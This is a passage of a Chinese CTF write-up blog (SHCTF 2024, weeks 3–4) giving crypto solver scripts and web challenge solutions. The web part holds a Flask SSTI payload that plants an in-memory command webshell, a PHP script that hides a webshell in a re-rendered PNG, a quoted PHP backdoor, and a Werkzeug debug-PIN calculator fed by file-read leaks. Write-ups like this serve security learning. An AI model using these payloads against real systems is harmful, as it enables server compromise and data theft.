魔鬼的步伐</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> gcd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pollard_p1</span>(<span class="hljs-params">n</span>):<br>    a = <span class="hljs-number">2</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">100000</span>):<br>        a = <span class="hljs-built_in">pow</span>(a, i, n)<br>        d = gcd(a - <span class="hljs-number">1</span>, n)<br>        <span class="hljs-keyword">if</span> <span class="hljs-number">1</span> &lt; d &lt; n:<br>            <span class="hljs-keyword">return</span> d<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>n = <span class="hljs-number">2831832791030609530715813213220019883048914189158756797307958158408447051630508377374040550762130532585789257283656903976093710799661936572635199760487152921738463539735395878201301223666364287975878427298711981759489133322514450542491313745324153974993874104970865609328318781784747005428502998650052645698811657</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">277886534227205145921457730106662348869574033254759302593748922500501707927099574576237860088700790266316998558285705873756211980752787668038757766667343292786435728705389634346196021354871807428435121426405798244396230131921055698729045936487882618606410991938850305317286706006559422640483458860444177938881800</span><br><br><span class="hljs-comment"># 使用 Pollard&#x27;s p-1 算法来因式分解 n</span><br>p = pollard_p1(n)<br>q = n // p<br><br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br><br>d = <span class="hljs-built_in">pow</span>(e, -<span class="hljs-number">1</span>, phi)<br><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><br>flag = long_to_bytes(m).decode()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decrypted flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="worde很大"><a class="markdownIt-Anchor" href="#worde很大"></a> worde很大</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime,long_to_bytes<br><span class="hljs-keyword">import</span> gmpy2<br><br>n = <span class="hljs-number">130433353485114808362891473473687063450960194937676119243199446452481897128998745221120731419339412044208064119908758711834838645767782724735230587850283436574369664159096103050287644689328716204472869291844135677716993421012781378455475934816332308522080394895659167943720237016096316321598240463439917555281</span><br>c = <span class="hljs-number">113481028807797740037371035561982400582216347323064462704823511064717743759816353553711535800864287099830079892568173444272959071112043294532294530031945500092151286531985831158853663827132668376187003261937157640029140101561586890243591683063607063713791333133210662159262006241032211052722483961060241094497</span><br>e = <span class="hljs-number">1052399395403315650954843878395162921915412936034670295881299</span><br>dp = <span class="hljs-number">10401970562842714823433011053885095731667426359291853822584611025061595365689032401513692452915352091669078429838636807965495759380977994966274049008153199</span><br>a = getPrime(<span class="hljs-number">10</span>)<br><br>p = gmpy2.gcd(<span class="hljs-built_in">pow</span>(a,dp*e,n)-a,n) <br>m = <span class="hljs-built_in">pow</span>(c,dp,p)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h1 id="week3"><a class="markdownIt-Anchor" href="#week3"></a> week3</h1><h2 id="crypto-3"><a class="markdownIt-Anchor" href="#crypto-3"></a> crypto</h2><h3 id="babylcg"><a class="markdownIt-Anchor" href="#babylcg"></a> babyLCG</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> itertools<br><br><span class="hljs-comment"># Given parameters</span><br>a = <span class="hljs-number">2314263556681405131427434567397721554084880715002737002374447625890031179538396443026861034624920599042538939666756802003</span><br>b = <span class="hljs-number">2303270095373091755028150204192621881624870682086240301196159556738806285789162309361059161301421010273000801707364139301</span><br>p = <span class="hljs-number">1785338523770596929007042881767789771169994055441005505378421343570059111347682949630788644017267333793887728906549496559</span><br>c = [<br>    <span class="hljs-number">1241585594145948568010297947806690682620161405184519680517131577883608946115221281877403406394716</span>,<br>    <span class="hljs-number">783745699152795646128200231796229145162258118907090494213671524973697625898415316535828899751033</span>,<br>    <span class="hljs-number">244960939438293041293560739941286165510749607918699325252666815425914305519670411696985473344258</span><br>]<br><br><span class="hljs-comment"># Define the small_roots function</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">small_roots</span>(<span class="hljs-params">f, bounds, m=<span class="hljs-number">1</span>, d=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> d:<br>        d = f.degree()<br>    R = f.base_ring()<br>    N = R.cardinality()<br>    f /= f.coefficients().pop(<span class="hljs-number">0</span>)<br>    f = f.change_ring(ZZ)<br>    G = <span class="hljs-type">Sequence</span>([], f.parent())<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m + <span class="hljs-number">1</span>):<br>        base = N ** (m - i) * f ** i<br>        <span class="hljs-keyword">for</span> shifts <span class="hljs-keyword">in</span> itertools.product(<span class="hljs-built_in">range</span>(d), repeat=f.nvariables()):<br>            g = base * prod(<span class="hljs-built_in">map</span>(power, f.variables(), shifts))<br>            G.append(g)<br>    B, monomials = G.coefficient_matrix()<br>    monomials = vector(monomials)<br>    factors = [monomial(*bounds) <span class="hljs-keyword">for</span> monomial <span class="hljs-keyword">in</span> monomials]<br>    <span class="hljs-keyword">for</span> i, factor <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(factors):<br>        B.rescale_col(i, factor)<br>    B = B.dense_matrix().LLL()<br>    B = B.change_ring(QQ)<br>    <span class="hljs-keyword">for</span> i, factor <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(factors):<br>        B.rescale_col(i, <span class="hljs-number">1</span> / factor)<br>    H = <span class="hljs-type">Sequence</span>([], f.parent().change_ring(QQ))<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">filter</span>(<span class="hljs-literal">None</span>, B * monomials):<br>        H.append(h)<br>        I = H.ideal()<br>        <span class="hljs-keyword">if</span> I.dimension() == -<span class="hljs-number">1</span>:<br>            H.pop()<br>        <span class="hljs-keyword">elif</span> I.dimension() == <span class="hljs-number">0</span>:<br>            roots = []<br>            <span class="hljs-keyword">for</span> root <span class="hljs-keyword">in</span> I.variety(ring=ZZ):<br>                root = <span class="hljs-built_in">tuple</span>(R(root[var]) <span class="hljs-keyword">for</span> var <span class="hljs-keyword">in</span> f.variables())<br>                roots.append(root)<br>            <span class="hljs-keyword">return</span> roots<br>    <span class="hljs-keyword">return</span> []<br><br><span class="hljs-comment"># Reconstructing the polynomial</span><br>PR.&lt;x, y&gt; = PolynomialRing(Zmod(p))<br>f = ((c[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">80</span>) + x) * a + b - ((c[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">80</span>) + y)<br><br><span class="hljs-comment"># Finding small roots</span><br>roots = small_roots(f, (<span class="hljs-number">2</span>**<span class="hljs-number">80</span>, <span class="hljs-number">2</span>**<span class="hljs-number">80</span>), m=<span class="hljs-number">4</span>, d=<span class="hljs-number">4</span>)<br><br><span class="hljs-comment"># Calculating the seed</span><br>s1 = (c[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">80</span>) + roots[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]<br>seed = (s1 - b) * inverse_mod(a, p) % p<br><br><span class="hljs-comment"># Converting the seed back to bytes</span><br>flag = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(seed)[<span class="hljs-number">2</span>:]).decode()<br><span class="hljs-built_in">print</span>(flag)  <span class="hljs-comment"># Outputs the original flag</span><br><br></code></pre></td></tr></table></figure><h2 id="web-3"><a class="markdownIt-Anchor" href="#web-3"></a> web</h2><h3 id="小小cms"><a class="markdownIt-Anchor" href="#小小cms"></a> 小小cms</h3><p>先试了/admin，有登录窗口，默认密码登陆，简单搜查一下，有个数据库里面插入了flag，dump下来发现是假的flag，然后创建了一个用户试了一下前端传马看看是否执行，不行，没办法去搜了一下7.0的漏洞，直接按照这个url进行shell的<a href="https://blog.csdn.net/shelter1234567/article/details/138524342%EF%BC%8C%E6%9C%80%E5%90%8E%E4%B8%8A%E6%88%AA%E5%9B%BE">https://blog.csdn.net/shelter1234567/article/details/138524342，最后上截图</a></p><p><img src="/../../images/shctf/2024/18.png" alt="18"></p><h3 id="love_flask"><a class="markdownIt-Anchor" href="#love_flask"></a> love_flask</h3><p>简单的ssti的内存马，测试是没有回显的，我尝试了两种方法，一种是内部弹shell给我vps没有成功，还有一种是直接执行rce，上马</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123; url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;app.add_url_rule(&#x27;/orange&#x27;, &#x27;orange&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>, &#123;<span class="hljs-string">&#x27;_request_ctx_stack&#x27;</span>: url_for.__globals__[<span class="hljs-string">&#x27;_request_ctx_stack&#x27;</span>], <span class="hljs-string">&#x27;app&#x27;</span>: url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>]&#125;) &#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/../../images/shctf/2024/19.png" alt="19"></p><h3 id="拜师之旅番外"><a class="markdownIt-Anchor" href="#拜师之旅番外"></a> 拜师之旅·番外</h3><p>png的二次渲染，上脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br><br><br><span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];<br>   <span class="hljs-variable">$color</span> = <span class="hljs-title function_ invoke__">imagecolorallocate</span>(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   <span class="hljs-title function_ invoke__">imagesetpixel</span>(<span class="hljs-variable">$img</span>, <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;./1.png&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>执行0=system和post发包1=cat /flag</p><p>然后ctrl+s保存图片用记事本看得到flag</p><p><img src="/../../images/shctf/2024/20.png" alt="20"></p><h3 id="hacked_website复现"><a class="markdownIt-Anchor" href="#hacked_website复现"></a> hacked_website(复现)</h3><p>当时扫到了<code>www.zip</code>，下载可以看文件，<s>然后就没思路了</s>当时没想到用d盾扫一下</p><p><img src="/../../images/shctf/2024/21.png" alt="21"></p><p>可以发现是有后面的，定位一下关键文件</p><p>文件里有这个门</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;sys&#x27;</span>;<span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;tem&#x27;</span>;<span class="hljs-variable">$x</span> = <span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>;<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;SH&#x27;</span>])) &#123;<span class="hljs-variable">$z</span> = <span class="hljs-string">&quot;&#x27;&#x27;&quot;</span>;&#125; <span class="hljs-keyword">else</span> <span class="hljs-variable">$z</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;SH&#x27;</span>];<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>/admin里面登陆一下，fuzz一下密码</p><p><img src="/../../images/shctf/2024/22.png" alt="22"></p><p>到对应的php里面输入得到flag<s>明明挺简单的为什么没想到解法</s>，当时全在往typecho的cve里面想</p><p><img src="/../../images/shctf/2024/23.png" alt="23"></p><h3 id="顰复现"><a class="markdownIt-Anchor" href="#顰复现"></a> 顰(复现)</h3><p>应该考察的就是算pin，写题的时候其他的数据都找到了没找到<code>console</code>，不明白为什么不触发orz</p><p>官p给了一个链接<a href="https://werkzeug.palletsprojects.com/en/stable/debug/">调试应用程序 — Werkzeug 中文文档 （3.0.x） (palletsprojects.com)</a></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">By default, , any subdomain, and are trusted. will trust its argument as well. To change this further, use the debug middleware directly rather than through .localhost.localhost127.0.0.1run<span class="hljs-emphasis">_simplehostnameuse_</span>debugger=True<br></code></pre></td></tr></table></figure><p>需要host是<code>127.0.0.1</code>添加header <code>Host:127.0.0.1</code>剩余的正常都可以找到</p><p><img src="/../../images/shctf/2024/24.png" alt="24"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">/sys/class/net/eth0/address----&gt;b6:45:6c:7d:2e:b1 #mac<br>/proc/sys/kernel/random/boot<span class="hljs-emphasis">_id-----&gt;d45a88e1-3fe4-4156-9e59-3864587b7c87 #private</span><br><span class="hljs-emphasis">/proc/self/cgroup-----&gt;0::/ </span><br><span class="hljs-emphasis">/../../../../../../../etc/passwd-----&gt;root:x:0:0:root:/root:/bin/  #pub</span><br><span class="hljs-emphasis">/usr/local/lib/python3.10/site-packages/werkzeug/debug/<span class="hljs-strong">__init__</span>.py #挨个试</span><br></code></pre></td></tr></table></figure><p>算pin的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mac_to_decimal</span>(<span class="hljs-params">mac_address</span>):<br>    hex_pairs = mac_address.split(<span class="hljs-string">&#x27;:&#x27;</span>)<br>    decimal_value = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># 将每个十六进制对转换为十进制并累加</span><br>    <span class="hljs-keyword">for</span> hex_pair <span class="hljs-keyword">in</span> hex_pairs:<br>        decimal_value = (decimal_value &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-built_in">int</span>(hex_pair, <span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">return</span> decimal_value<br><br><br>mac_address = <span class="hljs-string">&quot;b6:45:6c:7d:2e:b1&quot;</span>  <span class="hljs-comment"># /sys/class/net/eth0/address</span><br><br><span class="hljs-comment"># 调用函数将 MAC 地址转换为十进制数值</span><br>mac = <span class="hljs-built_in">str</span>(mac_to_decimal(mac_address))<br><br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;root&#x27;</span>  <span class="hljs-comment"># username 可通过/etc/passwd获取</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,  <span class="hljs-comment"># modname默认值</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,  <span class="hljs-comment"># 默认值</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.10/site-packages/flask/app.py&#x27;</span><br>]<br><br>private_bits = [<br>    mac,  <span class="hljs-comment"># mac地址十进制</span><br>    <span class="hljs-string">&#x27;d45a88e1-3fe4-4156-9e59-3864587b7c87&#x27;</span><br>    <span class="hljs-comment"># /proc/sys/kernel/random/boot_id + /proc/self/cgroup  (name=systemd:) /proc/self/cgroup为空不用看</span><br>]<br><br>h = hashlib.sha1()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br></code></pre></td></tr></table></figure><p>因为每个请求都要host,可以看源码提交</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?__debugger__=<span class="hljs-built_in">yes</span>&amp;cmd=pinauth&amp;pin=293-579-492&amp;s=EiqMhkW0qaOHzFnqNEn3<br></code></pre></td></tr></table></figure><p>获取cookie</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-strong">__wzd6bde80ed812309855c21=1730390066|aad426b2f48c</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/shctf/2024/25.png" alt="25"></p><h1 id="week4"><a class="markdownIt-Anchor" href="#week4"></a> week4</h1><h2 id="crypto-4"><a class="markdownIt-Anchor" href="#crypto-4"></a> crypto</h2><h3 id="mt19937"><a class="markdownIt-Anchor" href="#mt19937"></a> MT19937</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad, unpad<br><span 